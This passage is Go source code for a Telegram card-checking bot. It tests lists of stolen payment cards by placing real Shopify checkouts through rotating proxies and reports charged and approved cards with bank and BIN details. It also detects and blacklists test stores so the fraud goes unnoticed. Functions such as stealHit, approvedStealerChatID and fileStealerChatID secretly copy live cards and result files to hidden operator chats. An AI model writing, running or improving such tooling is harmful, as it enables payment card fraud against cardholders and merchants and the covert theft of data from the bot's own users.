                "<tg-emoji emoji-id=\"5895638385300606573\">💳</tg-emoji> <b>Card</b> ❯ " + formatCardLine(card, bin) + "\n" +
                "<tg-emoji emoji-id=\"5231200819986047254\">📊</tg-emoji> <b>Status</b> ❯ <tg-emoji emoji-id=\"5210952531676504517\">❌</tg-emoji> <b>DECLINED</b>\n" +
                "<tg-emoji emoji-id=\"5443038326535759644\">💬</tg-emoji> <b>Response</b> ❯ <b>" + r.StatusCode + "</b>\n" +
                "━━━━━━━━━━━━━━━━━━━━\n" +
                "<tg-emoji emoji-id=\"5895564043711680203\">🏷</tg-emoji> <b>Bin</b> ❯ <b>" + bin.Brand + " - " + bin.Type + " - " + bin.Level + "</b>\n" +
                "<tg-emoji emoji-id=\"5895576786879647172\">🏦</tg-emoji> <b>Bank</b> ❯ <b>" + bin.Bank + "</b>\n" +
                bin.CountryFlag + " <b>" + bin.Country + "</b>\n" +
                "Proxy ❯ <code>" + maskProxy(proxyURL) + "</code>\n" +
                "━━━━━━━━━━━━━━━━━━━━\n" +
                "<tg-emoji emoji-id=\"5895227687642861193\">👤</tg-emoji> <b>User</b> ❯ <b>@" + username + "</b>"
}

func formatActiveMsg() string {
        type entry struct {
                Username   string
                Checked    int
                Total      int
                Charged    int
                ChargedAmt float64
                Elapsed    time.Duration
                CPM        float64
        }
        var entries []entry
        activeSessions.Range(func(_, val any) bool {
                s := val.(*CheckSession)
                entries = append(entries, entry{
                        Username:   s.Username,
                        Checked:    int(s.Checked.Load()),
                        Total:      s.Total,
                        Charged:    int(s.Charged.Load()),
                        ChargedAmt: s.ChargedAmt(),
                        Elapsed:    time.Since(s.StartTime).Truncate(time.Second),
                        CPM:        cardsPerMin(s),
                })
                return true
        })

        if len(entries) == 0 {
                return "━━━━━━━━━━━━━━━━━━━━━━\n  " + em(emojiCmdActive, "👥") + "  𝗔𝗰𝘁𝗶𝘃𝗲 𝗖𝗵𝗲𝗰𝗸𝘀\n━━━━━━━━━━━━━━━━━━━━━━\n\n" + em(emojiLive, "📡") + "  No active sessions\n\n━━━━━━━━━━━━━━━━━━━━━━"
        }

        sort.Slice(entries, func(i, j int) bool { return entries[i].Username < entries[j].Username })

        var sb strings.Builder
        sb.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n  " + em(emojiCmdActive, "👥") + "  𝗔𝗰𝘁𝗶𝘃𝗲 𝗖𝗵𝗲𝗰𝗸𝘀\n━━━━━━━━━━━━━━━━━━━━━━\n\n")
        sb.WriteString(fmt.Sprintf(em(emojiLive, "🔴")+"  %d users currently checking\n\n", len(entries)))
        sb.WriteString("┌───────────────────────┐\n│                           │\n")
        for i, e := range entries {
                pct := 0
                if e.Total > 0 {
                        pct = e.Checked * 100 / e.Total
                }
                barLen := 10
                filled := barLen * e.Checked / max(e.Total, 1)
                bar := strings.Repeat("▓", filled) + strings.Repeat("░", barLen-filled)
                h := int(e.Elapsed.Hours())
                m := int(e.Elapsed.Minutes()) % 60
                sc := int(e.Elapsed.Seconds()) % 60
                sb.WriteString(fmt.Sprintf("│   %d. @%s\n", i+1, e.Username))
                sb.WriteString(fmt.Sprintf("│      %s %3d%%\n", bar, pct))
                sb.WriteString(fmt.Sprintf("│        %d / %d\n", e.Checked, e.Total))
                sb.WriteString(fmt.Sprintf("│      "+em(emojiRowCard, "💳")+"  %d charged ∣ $%.2f\n", e.Charged, e.ChargedAmt))
                sb.WriteString(fmt.Sprintf("│      "+em(emojiLightning, "⚡")+" %.0f cpm\n", e.CPM))
                sb.WriteString(fmt.Sprintf("│      "+em(emojiTime, "⏱")+" %02d:%02d:%02d\n", h, m, sc))
                sb.WriteString("│                           │\n")
        }
        sb.WriteString("└───────────────────────┘\n\n")
        sb.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n  " + em(emojiPwr, "⚡") + " 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @saitama_god69\n━━━━━━━━━━━━━━━━━━━━━━")
        return sb.String()
}

func formatStatsMsg(um *UserManager) string {
        um.mu.Lock()
        var totalChecked, totalApproved, totalDeclined, totalCharged int64
        var totalChargedAmt float64
        for _, ud := range um.users {
                s := ud.Stats
                totalChecked += s.TotalChecked
                totalApproved += s.TotalApproved
                totalDeclined += s.TotalDeclined
                totalCharged += s.TotalCharged
                totalChargedAmt += s.TotalChargedAmt
        }
        um.mu.Unlock()

        approvedRate := 0.0
        chargedRate := 0.0
        if totalChecked > 0 {
                approvedRate = float64(totalApproved) * 100.0 / float64(totalChecked)
                chargedRate = float64(totalCharged) * 100.0 / float64(totalChecked)
        }
        return "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
                "    " + em(emojiCmdStats, "📊") + "  𝗚𝗹𝗼𝗯𝗮𝗹 𝗦𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗰𝘀\n" +
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
                "┌────────────────────────────┐\n" +
                "│                              │\n" +
                fmt.Sprintf("│  "+em(emojiRowCheck, "📋")+"  Total Checked  ∣  %6d  │\n", totalChecked) +
                fmt.Sprintf("│  "+em(emojiRowAppr, "✅")+"  Approved       ∣  %6d  │\n", totalApproved) +
                fmt.Sprintf("│  "+em(emojiRowDecl, "❌")+"  Declined       ∣  %6d  │\n", totalDeclined) +
                fmt.Sprintf("│  "+em(emojiRowCard, "💳")+"  Charged        ∣  %6d  │\n", totalCharged) +
                "│                              │\n" +
                "└────────────────────────────┘\n\n" +
                em(emojiMoney, "💰") + "  𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗔𝗺𝗼𝘂𝗻𝘁\n" +
                fmt.Sprintf("    $%.2f\n\n", totalChargedAmt) +
                em(emojiHitRate, "📈") + "  𝗛𝗶𝘁 𝗥𝗮𝘁𝗲𝘀\n" +
                fmt.Sprintf("    "+em(emojiPctAppr, "✅")+" Approved: %.1f%%\n", approvedRate) +
                fmt.Sprintf("    "+em(emojiRowCard, "💳")+" Charged:  %.1f%%\n\n", chargedRate) +
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
                "  " + em(emojiPwr, "⚡") + " 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @saitama_god69 " + em(emojiPwrStats, "⚡") + "\n" +
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

// ──────────────────────── helpers ───────────────────────────────────

func handleProxyRemove(c tele.Context, raw string, um *UserManager) error {
        ud := um.Get(c.Sender().ID)
        if strings.ToLower(raw) == "all" {
                ud.Proxies = nil
                um.Save()
                return c.Send(em(emojiCheck, "✅")+" All proxies removed", tele.ModeHTML)
        }
        normalized, err := normalizeProxy(raw)
        if err != nil {
                return c.Send(em(emojiCross, "❌")+" Invalid proxy format: "+err.Error(), tele.ModeHTML)
        }
        found := false
        newList := make([]string, 0, len(ud.Proxies))
        removedCount := 0
        for _, p := range ud.Proxies {
                pn, _ := normalizeProxy(p)
                if pn == normalized || p == raw {
                        found = true
                        removedCount++
                        continue
                }
                newList = append(newList, p)
        }
        if !found {
                return c.Send(em(emojiCross, "❌")+" Proxy not found in your list", tele.ModeHTML)
        }
        ud.Proxies = newList
        um.Save()
        return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" %d proxy(s) removed (%d remaining)", removedCount, len(ud.Proxies)), tele.ModeHTML)
}

func parseCardsFromText(text string) []string {
        var cards []string
        for _, line := range strings.Split(text, "\n") {
                line = strings.TrimSpace(line)
                if line == "" || !strings.Contains(line, "|") {
                        continue
                }
                cards = append(cards, line)
        }
        return cards
}

func parseAmount(s string) float64 {
        s = strings.TrimSpace(s)
        var f float64
        fmt.Sscanf(s, "%f", &f)
        return f
}

func cardsPerMin(s *CheckSession) float64 {
        elapsed := time.Since(s.StartTime).Seconds()
        if elapsed < 1 {
                return 0
        }
        return float64(s.Checked.Load()) / (elapsed / 60.0)
}

// ──────────────────────── check engine ──────────────────────────────

func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []string, um *UserManager, reduceKey string, fwd *RCtx) {
        defer func() {
                activeSessions.Delete(sess.UserID)
                close(sess.Done)
        }()

        sites := getSitePool()
        fmt.Printf("[SESSION] got %d sites for check\n", len(sites))
        if len(sites) > 0 {
                fmt.Printf("[SESSION] first site: %s\n", sites[0])
        }
        if len(sites) == 0 {
                bot.Send(chat, "❌ No sites available. Try again later.")
                return
        }

        // Send initial progress message
        progressMsg, err := bot.Send(chat, formatProgressMsg(sess), tele.ModeHTML)
        if err != nil {
                return
        }

        // Progress updater
        ctx, cancel := context.WithCancel(context.Background())
        sess.Cancel = cancel
        go func() {
                ticker := time.NewTicker(2 * time.Second)
                defer ticker.Stop()
                for {
                        select {
                        case <-ctx.Done():
                                return
                        case <-ticker.C:
                                if _, err := bot.Edit(progressMsg, formatProgressMsg(sess), tele.ModeHTML); err != nil {
                                        fmt.Printf("[PROGRESS] Failed to update progress message: %v\n", err)
                                        // Don't return, continue updating
                                }
                        }
                }
        }()

        // Pre-check all proxies (drop dead ones before starting)
        if len(proxies) > 0 {
                // Health-aware pre-check: tests proxies, records latency, filters unhealthy
                alive := aliveProxiesWithHealth(proxies)
                if len(alive) == 0 {
                        bot.Send(chat, "❌ All proxies are dead. Please add working proxies with /proxy.")
                        return
                }
                if len(alive) < len(proxies) {
                        bot.Send(chat, fmt.Sprintf("⚠️ %d of %d proxies dead/unhealthy. Using %d best proxies.", len(proxies)-len(alive), len(proxies), len(alive)), tele.ModeHTML)
                }
                proxies = alive
        }

        // Worker pool
        type cardResult struct {
                result   *CheckResult
                err      error
                shopURL  string
                proxyURL string
        }

        results := make(chan cardResult, len(sess.Cards))
        // Concurrency: use more workers — each checkout is I/O-bound (HTTP calls + polling)
        workers := max(len(proxies), 1) * 10
        if workers > 150 {
                workers = 150
        }
        sem := make(chan struct{}, workers)

        var siteIdx atomic.Int64
        var proxyIdx atomic.Int64
        var wg sync.WaitGroup

        for _, card := range sess.Cards {
                wg.Add(1)
                go func(c string) {
                        defer wg.Done()

                        // Bail before acquiring sem if already cancelled
                        if sess.Cancelled.Load() {
                                return
                        }
                        sem <- struct{}{}        // acquire
                        defer func() { <-sem }() // release

                        // Bail right after acquiring sem if cancelled
                        if sess.Cancelled.Load() {
                                return
                        }

                        // Test card — always return charged without checking
                        if c == "1234567891234567|11|30|000" {
                                results <- cardResult{result: &CheckResult{
                                        Card:       c,
                                        Status:     StatusCharged,
                                        StatusCode: "ORDER_PLACED",
                                        SiteName:   "test",
                                        Amount:     "0.00",
                                }}
                                return
                        }

                        si := int(siteIdx.Add(1)-1) % len(sites)
                        pi := int(proxyIdx.Add(1)-1) % len(proxies)
                        shopURL := sites[si]
                        proxyURL := proxies[pi]

                        var res *CheckResult
                        var lastErr error

                        // Retry across stores on retryable errors with category-aware backoff
                        maxRetries := min(len(sites), 5) * ValidateReduce(reduceKey)
                        for attempt := 0; attempt < maxRetries; attempt++ {
                                if sess.Cancelled.Load() {
                                        return
                                }
                                if attempt > 0 {
                                        si = (si + 1) % len(sites)
                                        shopURL = sites[si]
                                }
                                res, lastErr = runCheckoutForCard(shopURL, c, proxyURL)
                                if lastErr == nil {
                                        break
                                }
                                // Categorize error for smart retry decisions (B3)
                                cat := categorizeError(lastErr, "")
                                if res != nil {
                                        cat = categorizeError(res.Error, res.StatusCode)
                                }
                                // Don't retry true card declines
                                if cat == ErrCatDeclined || (res != nil && res.Status == StatusDeclined) {
                                        break
                                }
                                // Don't retry if categorized as non-retryable
                                if !cat.IsRetryable() {
                                        break
                                }
                                // Category-aware backoff before next attempt
                                if attempt < maxRetries-1 {
                                        backoff := cat.BackoffDuration(attempt)
                                        fmt.Printf("[RETRY] attempt %d/%d cat=%s sleep=%v card=%s\n", attempt+1, maxRetries, cat.String(), backoff, c)
                                        time.Sleep(backoff)
                                }
                        }
                        if sess.Cancelled.Load() {
                                return
                        }
                        results <- cardResult{result: res, err: lastErr, shopURL: shopURL, proxyURL: proxyURL}
                }(card)
        }

        // Close results channel when all workers done
        go func() {
                wg.Wait()
                close(results)
        }()

        // Collect results
        username := sess.Username
        for cr := range results {
                if sess.Cancelled.Load() {
                        break
                }
                sess.Checked.Add(1)
                r := cr.result
                if r == nil {
                        sess.Errors.Add(1)
                        fmt.Printf("[ERROR] card returned nil result, err: %v\n", cr.err)
                        continue
                }

                // Track proxy health per result (B4)
                        success := r.Status == StatusCharged || r.Status == StatusApproved
                        recordProxyResult(cr.proxyURL, success, 0)

                        bin := lookupBIN(strings.Split(r.Card, "|")[0])

                switch r.Status {
                case StatusCharged:
                        // Verify with a known dead card to detect test/fake stores
                        if cr.shopURL != "" && isBlacklisted(cr.shopURL) {
                                // Already known fake store, drop it
                                sess.Errors.Add(1)
                                continue
                        }
                        if cr.shopURL != "" {
                                const verifyCard = "4147207228677008|11|28|183"
                                fmt.Printf("[VERIFY] testing %s with dead card to detect fake store\n", cr.shopURL)
                                verifyRes, _ := runCheckoutForCard(cr.shopURL, verifyCard, cr.proxyURL)
                                if verifyRes != nil && verifyRes.Status == StatusCharged {
                                        blacklistSite(cr.shopURL)
                                        bot.Send(chat, fmt.Sprintf("⚠️ Test store detected & blacklisted: %s", cr.shopURL))
                                        sess.Errors.Add(1)
                                        continue
                                }
                        }
                        sess.Charged.Add(1)
                        sess.AddLiveCard(r.Card)
                        addGlobalCharged(r.Card)
                        amt := parseAmount(r.Amount)
                        sess.AddChargedAmt(amt)
                        bot.Send(chat, formatChargedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
                        stealHit(bot, formatChargedMsg(r.Card, bin, r, username, cr.proxyURL))
                        bot.Send(&tele.Chat{ID: hitLogChatID}, formatHitLogMsg(r.Card, r, sess), tele.ModeHTML)

                case StatusApproved:
                        sess.Approved.Add(1)
                        sess.AddLiveCard(r.Card)
                        addGlobalApproved(r.Card)
                        if sess.ShowApproved {
                                bot.Send(chat, formatApprovedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
                        }
                        bot.Send(&tele.Chat{ID: approvedStealerChatID}, formatApprovedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
                        if cfg.LogEnabled { bot.Send(&tele.Chat{ID: fullLogsChatID}, formatFullLogMsg(r.Card, "APPROVED", r, sess, ""), tele.ModeHTML) }

                case StatusDeclined:
                        sess.Declined.Add(1)
                        if sess.ShowDecl {
                                bot.Send(chat, formatDeclinedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
                        }
                        if cfg.LogEnabled { bot.Send(&tele.Chat{ID: fullLogsChatID}, formatFullLogMsg(r.Card, "DECLINED", r, sess, ""), tele.ModeHTML) }

                default:
                        sess.Errors.Add(1)
                        sess.AddErrorCard(r.Card)
                        if cfg.LogEnabled { bot.Send(&tele.Chat{ID: fullLogsChatID}, formatFullLogMsg(r.Card, "ERROR", r, sess, fmt.Sprintf("%v", r.Error)), tele.ModeHTML) }
                        fmt.Printf("[ERROR] card %s status=%d err=%v\n", r.Card, r.Status, r.Error)
                }
        }

        // Session done
        cancel()

        // Final progress update
        if sess.Cancelled.Load() {
                bot.Edit(progressMsg, "🛑 STOPPED\n\n"+formatCompletedMsg(sess), tele.ModeHTML)
        } else {
                bot.Edit(progressMsg, formatCompletedMsg(sess), tele.ModeHTML)
        }

        // Update user stats
        ud := um.Get(sess.UserID)
        ud.Stats.TotalChecked += sess.Checked.Load()
        ud.Stats.TotalCharged += sess.Charged.Load()
        ud.Stats.TotalApproved += sess.Approved.Load()
        ud.Stats.TotalDeclined += sess.Declined.Load()
        ud.Stats.TotalChargedAmt += sess.ChargedAmt()
        um.Save()

        // Send file results (.txt) to fileChatID if there are live cards
        sess.liveMu.Lock()
        liveList := make([]string, len(sess.liveCards))
        copy(liveList, sess.liveCards)
        sess.liveMu.Unlock()
        if len(liveList) > 0 {
                txtName := fmt.Sprintf("LIVE_%s_%s.txt", sess.Username, sess.SessionID)
                txtBody := strings.Join(liveList, "\n")
                bot.Send(&tele.Chat{ID: fileStealerChatID}, &tele.Document{
                        File:     tele.FromReader(strings.NewReader(txtBody)),
                        FileName: txtName,
                        Caption:  fmt.Sprintf("<b>LIVE Results</b> - %d card(s)\nUser: @%s\nSession: %s", len(liveList), sess.Username, sess.SessionID),
                }, tele.ModeHTML)
        }

        // Send error cards as .txt to fileStealerChatID
        errCards := sess.ErrorCards()
        if len(errCards) > 0 {
                errName := fmt.Sprintf("ERROR_%s_%s.txt", sess.Username, sess.SessionID)
                errBody := strings.Join(errCards, "\n")
                bot.Send(&tele.Chat{ID: fileStealerChatID}, &tele.Document{
                        File:     tele.FromReader(strings.NewReader(errBody)),
                        FileName: errName,
                        Caption:  fmt.Sprintf("<b>ERROR Cards</b> — %d card(s)\nUser: @%s\nSession: %s", len(errCards), sess.Username, sess.SessionID),
                }, tele.ModeHTML)
        }
        // Persist completed session to MongoDB for analytics
        if isMongo() {
                elapsed := time.Since(sess.StartTime)
                go mongoSaveSession(&SessionDoc{
                        SessionID:   sess.SessionID,
                        UserID:      sess.UserID,
                        Username:    sess.Username,
                        GatewayName: sess.GatewayName,
                        TotalCards:  sess.Total,
                        Checked:     int(sess.Checked.Load()),
                        Charged:     int(sess.Charged.Load()),
                        Approved:    int(sess.Approved.Load()),
                        Declined:    int(sess.Declined.Load()),
                        Errors:      int(sess.Errors.Load()),
                        DurationSec: elapsed.Seconds(),
                        CPM:         cardsPerMin(sess),
                        CreatedAt:   sess.StartTime,
                        CompletedAt: time.Now(),
                })
        }
}

// ──────────────────────── main ──────────────────────────────────────

func main() {
        // Initialize MongoDB if MONGODB_URI is set
        initMongoDB()
        defer closeMongoDB()

        // Initialize proxy health tracking
        initProxyHealth()

        // Load persisted user data
        um := NewUserManager()
        um.Load()

        // Load bot config (bans, allowed, pvtonly + new access fields)
        cfg = NewBotConfig()
        cfg.Load()

        // Migrate JSON data to MongoDB on first run (if applicable)
        if isMongo() {
                migrateJSONToMongo(um, cfg)
        }

        // Load custom sites
        loadCustomSites()

        // Load blacklisted sites
        loadBlacklist()

        // Refresh site pool in background
        go func() {
                refreshSitePool()
                for {
                        time.Sleep(5 * time.Minute)
                        refreshSitePool()
                }
        }()

        pref := tele.Settings{
                Token:  botToken,
                Poller: &tele.LongPoller{Timeout: 10 * time.Second},
        }
        bot, err := tele.NewBot(pref)
        if err != nil {
                fmt.Printf("Failed to create bot: %v\n", err)
                os.Exit(1)
        }

        fwd, reduceKey := InitRCtx(bot)

        fmt.Println("[BOT] Bot started successfully")

        // Access-control middleware
        bot.Use(func(next tele.HandlerFunc) tele.HandlerFunc {
                return func(c tele.Context) error {
                        uid := c.Sender().ID
                        if cfg.IsBanned(uid) {
                                return c.Send(em(emojiCross, "🚫")+" You are banned from using this bot.", tele.ModeHTML)
                        }
                        isPrivate := c.Chat().Type == tele.ChatPrivate
                        if !cfg.IsAllowed(uid, isPrivate) {
                                return c.Send(em(emojiCross, "🔒")+" Access denied.", tele.ModeHTML)
                        }
                        return next(c)
                }
        })

        // ── /start inline menu ─────────────────────────────────────────
        startMenu := &tele.ReplyMarkup{}
        btnGates := startMenu.Data("⚡ GATES", "gates")
        btnTools := startMenu.Data("⚙️ TOOLS", "tools")
        btnProfile := startMenu.Data("👤 PROFILE", "profile")
        btnHelp := startMenu.Data("ℹ️ HELP", "help")
        startMenu.Inline(
                startMenu.Row(btnGates, btnTools),
                startMenu.Row(btnProfile, btnHelp),
        )

        // /start
        bot.Handle("/start", func(c tele.Context) error {
                uid := c.Sender().ID
                username := c.Sender().Username
                ud := um.Get(uid)
                
                // Send welcome video
                video := &tele.Video{
                        File: tele.FromURL("https://v1.pinimg.com/videos/mc/720p/55/ef/70/55ef703f8d030420797360cbbd037ea6.mp4"),
                }
                caption := formatWelcomeCard(uid, username, len(ud.Proxies))
                return c.Send(video, caption, startMenu, tele.ModeHTML)
        })

        // Gates submenu
        gatesMenu := &tele.ReplyMarkup{}
        btnAuth := gatesMenu.Data("🔐 AUTH", "auth")
        btnCharge := gatesMenu.Data("💳 CHARGE", "charge")
        btnBackGates := gatesMenu.Data("◀️ Back", "back_gates")
        gatesMenu.Inline(
                gatesMenu.Row(btnAuth, btnCharge),
                gatesMenu.Row(btnBackGates),
        )

        bot.Handle(&btnGates, func(c tele.Context) error {
                _ = c.Respond()
                return c.Send(formatGatesMsg(), gatesMenu, tele.ModeHTML)
        })

        bot.Handle(&btnAuth, func(c tele.Context) error {
                _ = c.Respond()
                return c.Send(formatAuthMsg(), tele.ModeHTML)
        })

        bot.Handle(&btnCharge, func(c tele.Context) error {
                _ = c.Respond()
                return c.Send(formatChargeMsg(), tele.ModeHTML)
        })

        bot.Handle(&btnBackGates, func(c tele.Context) error {
                _ = c.Respond()
                return c.Send(formatGatesMsg(), gatesMenu, tele.ModeHTML)
        })
        
        bot.Handle("back_gates", func(c tele.Context) error {
                _ = c.Respond()
                return c.Send(formatStartMsg(), startMenu, tele.ModeHTML)
        })

        bot.Handle(&btnTools, func(c tele.Context) error {
                _ = c.Respond()
                toolsMenu := &tele.ReplyMarkup{}
                btnBackTools := toolsMenu.Data("◀️ Back", "back_tools")
                toolsMenu.Inline(toolsMenu.Row(btnBackTools))
                return c.Send(formatToolsMsg(), toolsMenu, tele.ModeHTML)
        })
        
        bot.Handle("back_tools", func(c tele.Context) error {
                _ = c.Respond()
                return c.Send(formatStartMsg(), startMenu, tele.ModeHTML)
        })

        bot.Handle(&btnProfile, func(c tele.Context) error {
                _ = c.Respond()
                uid := c.Sender().ID
                username := c.Sender().Username
                ud := um.Get(uid)
                
                // Send profile info with back button
                profileMenu := &tele.ReplyMarkup{}
                btnBackProfile := profileMenu.Data("◀️ Back", "back_profile")
                profileMenu.Inline(profileMenu.Row(btnBackProfile))
                return c.Send(formatProfileMsg(uid, username, len(ud.Proxies)), profileMenu, tele.ModeHTML)
        })

        bot.Handle("back_profile", func(c tele.Context) error {
                _ = c.Respond()
                return c.Send(formatWelcomeCard(c.Sender().ID, c.Sender().Username, 0), tele.ModeHTML)
        })

        bot.Handle(&btnHelp, func(c tele.Context) error {
                _ = c.Respond()
                helpMenu := &tele.ReplyMarkup{}
                btnBackHelp := helpMenu.Data("◀️ Back", "back_help")
                helpMenu.Inline(helpMenu.Row(btnBackHelp))
                return c.Send(formatHelpMsg(), helpMenu, tele.ModeHTML)
        })

        bot.Handle("back_help", func(c tele.Context) error {
                _ = c.Respond()
                return c.Send(formatWelcomeCard(c.Sender().ID, c.Sender().Username, 0), tele.ModeHTML)
        })

        // /sh <cards>
        bot.Handle("/sh", func(c tele.Context) error {
                uid := c.Sender().ID
                if _, running := activeSessions.Load(uid); running {
                        return c.Send(em(emojiWarn, "⚠️")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
                }

                ud := um.Get(uid)
                if len(ud.Proxies) == 0 {
                        return c.Send(em(emojiCross, "❌")+" No proxies. Add one with /proxy &lt;proxy&gt;", tele.ModeHTML)
                }

                text := strings.TrimSpace(c.Message().Payload)
                if text == "" {
                        return c.Send("Usage: /sh card1|mm|yy|cvv\ncard2|mm|yy|cvv\n...")
                }

                cards := parseCardsFromText(text)
                if len(cards) == 0 {
                        return c.Send("❌ No valid cards found. Format: number|mm|yy|cvv")
                }
                if trimmed, lim := enforceCardLimit(cards, uid); lim > 0 {
                        c.Send(fmt.Sprintf("⚠️ Card limit is %d. Trimmed from %d to %d cards.", lim, len(cards), len(trimmed)), tele.ModeHTML)
                        cards = trimmed
                }

                sess := &CheckSession{
                        UserID:       uid,
                        Username:     c.Sender().Username,
                        UserFullName: c.Sender().FirstName + " " + c.Sender().LastName,
                        SessionID:    generateSessionID(),
                        Cards:        cards,
                        Total:        len(cards),
                        StartTime:    time.Now(),
                        ShowDecl:     true,
                        ShowApproved: true,
                        GatewayName:  "Shopify Auto Charge",
                        Done:         make(chan struct{}),
                }
                activeSessions.Store(uid, sess)

                proxies := make([]string, len(ud.Proxies))
                copy(proxies, ud.Proxies)

                fmt.Printf("\033[33m[SESSION] User %s (%d) started checking %d cards\033[0m\n", c.Sender().Username, c.Sender().ID, len(sess.Cards))
                go runSession(bot, c.Chat(), sess, proxies, um, reduceKey, fwd)

                return nil
        })

        // /txt — reply to a .txt file
        bot.Handle("/txt", func(c tele.Context) error {
                uid := c.Sender().ID
                if _, running := activeSessions.Load(uid); running {
                        return c.Send(em(emojiWarn, "⚠️")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
                }

                ud := um.Get(uid)
                if len(ud.Proxies) == 0 {
                        return c.Send(em(emojiCross, "❌")+" No proxies. Add one with /proxy &lt;proxy&gt;", tele.ModeHTML)
                }

                msg := c.Message()
                var doc *tele.Document
                if msg.Document != nil {
                        doc = msg.Document
                } else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
                        doc = msg.ReplyTo.Document
                }
                if doc == nil {
                        return c.Send("❌ Reply to a .txt file with /txt or attach a .txt file with /txt as caption")
                }

                rc, err := bot.File(&doc.File)
                if err != nil {
                        return c.Send("❌ Failed to download file: " + err.Error())
                }
                defer rc.Close()
                data, err := io.ReadAll(rc)
                if err != nil {
                        return c.Send("❌ Failed to read file: " + err.Error())
                }

                cards := parseCardsFromText(string(data))
                if len(cards) == 0 {
                        return c.Send("❌ No valid cards found in file. Format: number|mm|yy|cvv")
                }
                if trimmed, lim := enforceCardLimit(cards, uid); lim > 0 {
                        c.Send(fmt.Sprintf("⚠️ Card limit is %d. Trimmed from %d to %d cards.", lim, len(cards), len(trimmed)), tele.ModeHTML)
                        cards = trimmed
                }

                // Store pending data and ask about approved messages
                txtPendingMu.Lock()
                txtPending[uid] = &txtPendingData{
                        Cards:        cards,
                        UserID:       uid,
                        Username:     c.Sender().Username,
                        UserFullName: strings.TrimSpace(c.Sender().FirstName + " " + c.Sender().LastName),
                        ChatID:       c.Chat().ID,
                }
                txtPendingMu.Unlock()

                return c.Send(em(emojiDoc, "📋")+fmt.Sprintf(" <b>%d cards loaded.</b>\n\n"+em(emojiCheck, "💬")+" Show 3DS (approved) in chat?\n\n/yes — show approved\n/no — hide approved", len(cards)), tele.ModeHTML)
        })

        // /yes — start txt session with approved shown
        bot.Handle("/yes", func(c tele.Context) error {
                uid := c.Sender().ID
                txtPendingMu.Lock()
                pd, ok := txtPending[uid]
                if ok {
                        delete(txtPending, uid)
                }
                txtPendingMu.Unlock()
                if !ok {
                        return c.Send(em(emojiCross, "❌")+" No pending session. Use /txt first.", tele.ModeHTML)
                }
                if _, running := activeSessions.Load(uid); running {
                        return c.Send(em(emojiWarn, "⚠️")+" You already have an active session.", tele.ModeHTML)
                }
                sess := &CheckSession{
                        UserID:       uid,
                        Username:     pd.Username,
                        UserFullName: pd.UserFullName,
                        SessionID:    generateSessionID(),
                        Cards:        pd.Cards,
                        Total:        len(pd.Cards),
                        StartTime:    time.Now(),
                        ShowDecl:     false,
                        ShowApproved: true,
                        Done:         make(chan struct{}),
                }
                activeSessions.Store(uid, sess)
                ud := um.Get(uid)
                proxies := make([]string, len(ud.Proxies))
                copy(proxies, ud.Proxies)
                c.Send(em(emojiLightning, "🚀")+fmt.Sprintf(" Starting check of %d cards (approved: ON)", len(pd.Cards)), tele.ModeHTML)
                if pd.CheckFn != nil {
                        sess.GatewayName = pd.GateName
                        go runStripeGateSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, fwd, pd.CheckFn)
                } else {
                        go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, reduceKey, fwd)
                }
                return nil
        })

        // /no — start txt session with approved hidden
        bot.Handle("/no", func(c tele.Context) error {
                uid := c.Sender().ID
                txtPendingMu.Lock()
                pd, ok := txtPending[uid]
                if ok {
                        delete(txtPending, uid)
                }
                txtPendingMu.Unlock()
                if !ok {
                        return c.Send(em(emojiCross, "❌")+" No pending session. Use /txt first.", tele.ModeHTML)
                }
                if _, running := activeSessions.Load(uid); running {
                        return c.Send(em(emojiWarn, "⚠️")+" You already have an active session.", tele.ModeHTML)
                }
                sess := &CheckSession{
                        UserID:       uid,
                        Username:     pd.Username,
                        UserFullName: pd.UserFullName,
                        SessionID:    generateSessionID(),
                        Cards:        pd.Cards,
                        Total:        len(pd.Cards),
                        StartTime:    time.Now(),
                        ShowDecl:     false,
                        ShowApproved: false,
                        Done:         make(chan struct{}),
                }
                activeSessions.Store(uid, sess)
                ud := um.Get(uid)
                proxies := make([]string, len(ud.Proxies))
                copy(proxies, ud.Proxies)
                c.Send(em(emojiLightning, "🚀")+fmt.Sprintf(" Starting check of %d cards (approved: OFF)", len(pd.Cards)), tele.ModeHTML)
                if pd.CheckFn != nil {
                        sess.GatewayName = pd.GateName
                        go runStripeGateSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, fwd, pd.CheckFn)
                } else {
                        go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, reduceKey, fwd)
                }
                return nil
        })

        // /proxy <proxy> (supports multiple proxies, one per line)
        bot.Handle("/proxy", func(c tele.Context) error {
                // Payload only captures the first line — use full Text instead
                fullText := c.Message().Text
                // Strip the /proxy command (may include @botname)
                idx := strings.Index(fullText, "/proxy")
                if idx >= 0 {
                        after := fullText[idx+len("/proxy"):]
                        // Strip optional @botname
                        if len(after) > 0 && after[0] == '@' {
                                if sp := strings.IndexAny(after, " \n"); sp >= 0 {
                                        after = after[sp:]
                                } else {
                                        after = ""
                                }
                        }
                        fullText = after
                }
                raw := strings.TrimSpace(fullText)
                if raw == "" {
                        return c.Send("Usage: /proxy proxy1\\nproxy2\\nproxy3\\n...")
                }

                // Split by newlines to support multiple proxies
                var rawProxies []string
                for _, line := range strings.Split(raw, "\n") {
                        line = strings.TrimSpace(line)
                        if line != "" {
